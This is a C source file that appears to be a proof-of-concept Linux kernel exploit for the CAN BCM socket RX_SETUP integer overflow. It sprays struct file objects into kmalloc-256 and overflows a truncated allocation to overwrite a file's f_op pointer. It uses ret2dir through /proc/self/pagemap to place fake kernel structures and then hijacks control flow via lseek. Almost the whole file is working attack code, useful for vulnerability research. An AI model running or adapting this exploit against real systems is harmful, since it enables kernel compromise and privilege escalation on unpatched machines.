#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <keyutils.h>
#include <stdint.h>
#include <stdbool.h>
#include <pthread.h>
#include "libexp.h"

#define CRASH_IP 0xffffffffdeadbeef
#define SPRAY_NUM 1

#define SLUB "kmalloc-256"
#define ALLOCATION 256
#define FILLER 100

#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef CAN_BCM
#define CAN_BCM 2
#endif

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct sockaddr_can {
	sa_family_t can_family;
	int can_ifindex;
	union {
		struct { uint32_t rx_id, tx_id; } tp;
	} can_addr;
};

struct can_frame {
	uint32_t can_id;
	uint8_t can_dlc;
	uint8_t data[8] __attribute__((aligned(8)));
};

struct bcm_msg_head {
	uint32_t opcode;
	uint32_t flags;
	uint32_t count;
	struct timeval ival1, ival2;
	uint32_t can_id;
	uint32_t nframes;
	struct can_frame frames[0];
};

struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb0];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};

struct kernel_param {
	char hole1[0x10];
	void *ops;
	char hole2[0x8];
	void *arg;
};

struct kernel_param_ops {
	char hole1[0x10];
	uint64_t rdx; // void* get
	void* free;
};

#define RX_SETUP 5
#define RX_DELETE 6
#define CFSIZ sizeof(struct can_frame)
#define MHSIZ sizeof(struct bcm_msg_head)

int fd[SPRAY_NUM];
struct file fake_file;

int alloc_file() {
    for(int i = 0; i < SPRAY_NUM; i++) {
        fd[i] = open("/dev/null", O_RDONLY);
        if(unlikely(fd[i] < 0)) error_out("oops");
    }
    return 0;
}

void trigger(void* kaddr) {
	int i, ret, sock, cnt, base, smashed;
	int diff, active, total, active_new, total_new;
	int len, sock_len, mmap_len;
	struct sockaddr_can addr;
	struct bcm_msg_head *msg;
	void *efault;
	char *buf;

	printf("[+] creating PF_CAN socket...\n");

	sock = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (sock < 0) {
		printf("[-] kernel lacks CAN packet family support\n");
		exit(1);
	}

	printf("[+] connecting PF_CAN socket...\n");

	memset(&addr, 0, sizeof(addr));
	addr.can_family = PF_CAN;

	ret = connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	if (sock < 0) {
		printf("[-] could not connect CAN socket\n");
		exit(1);
	}

	len = MHSIZ + (CFSIZ * (ALLOCATION / 16));
	msg = malloc(len);
	memset(msg, 0, len);
	msg->can_id = 2959;
	// CFSIZ = 0x10
	// ALLOCATION = 256 = 0x10 * 16
	// UINT_MAX = 0xffffffff
	// kernel will allocate 256/16  = 0x10 
	// struct can_frame for twice
	msg->nframes = (UINT_MAX / CFSIZ) + 1 +  (ALLOCATION / 16);

	printf("[+] corrupting BCM OP with truncated allocation via RX_SETUP...\n");

	// first sendmsg
	msg->opcode = RX_SETUP;
	// set_cpu(0);
	defragment(0x100, 0x300);
	ts_fence();
	defragment(0x100, 40);
	ret = send(sock, msg, len, 0);
	if (unlikely(ret < 0)) {
		printf("[-] kernel rejected malformed CAN header\n");
		exit(1);
	}
	fflush(stdout);

	//nonsense();

	// put victim objects:
	// struct file
	if(alloc_file() == -1) {
		fprintf(stderr, "alloc_file err\n");
		return;
	}

	printf("[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...\n");

	// 0x10*256/16*3 = 0x10*3 = 0x30
	// mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 2) + 0x2b;
	mmap_len = MHSIZ + (CFSIZ * (ALLOCATION / 16) * 3) ;
	efault = mmap(NULL, mmap_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	printf("[+] mmap'ed mapping of length %d at %p\n", mmap_len, efault);

	printf("[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...\n");

	msg = (struct bcm_msg_head *) efault;
	memset(msg, 0, mmap_len);
	msg->can_id = 2959;
	// tell kernel that more than 
	// ALLOCATION/16*3 bytes need to be copied
	msg->nframes = (ALLOCATION / 16) * 4;

	// second sendmsg
	msg->opcode = RX_SETUP;

	buf = (char*) msg;

	// overwrite f_op
	memcpy(&buf[MHSIZ + (ALLOCATION * 2)], &fake_file, sizeof(struct file));

	ret = send(sock, msg, mmap_len, 0);
	if (ret != -1 && errno != EFAULT) {
		printf("[-] couldn't trigger EFAULT, exploit aborting!\n");
		exit(1);
	}

	// trigger
	for(int i=SPRAY_NUM-1; i>=0; i--)
		lseek(fd[i], 0, SEEK_SET);

}

// | file_operations | kernel_param_ops *4 | irq_desc | irqaction | deref_fetch_param |
void construct_malicious_data(void* kaddr) {
	memset(&fake_file, 0, sizeof(struct file));
	fake_file.f_op = kaddr;
	fake_file.f_mode = 0x5801e;

	// hijack control flow to destroy_params to fork
	struct file_operations fake_file_operations;
	fake_file_operations.llseek = (void*)CRASH_IP;
	memcpy((void*)USER_ADDR, &fake_file_operations, sizeof(struct file_operations));

	// embed kernel_param array in file
	struct kernel_param* fake_kernel_param = (struct kernel_param*)&fake_file;

	// kernel_param 2
	fake_kernel_param = (struct kernel_param*)((char*)&fake_file + 
			sizeof(struct kernel_param));
	// -10 because it used to be f_count in struct file
    // thread makes it +1
	fake_kernel_param->ops = (void*)(kaddr + 
			sizeof(struct file_operations) + 
			sizeof(struct kernel_param_ops) - 10);
	return;
}

void* setup_dir() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 'A', PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        uint64_t kaddr = 0;
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
        construct_malicious_data((void*)kaddr);
    }
err:
	close(fd);
    return ret;
}

void *setup_payload()
{
	return setup_dir();
}

int main(int argc, char **argv) {
	sleep(1);
	// the vulnerability uses copy_from_user_iter, so it must be a kernel pointer, we use ret2dir for it
	void *dir_addr = setup_payload();
	trigger(dir_addr);
	return 0;
}
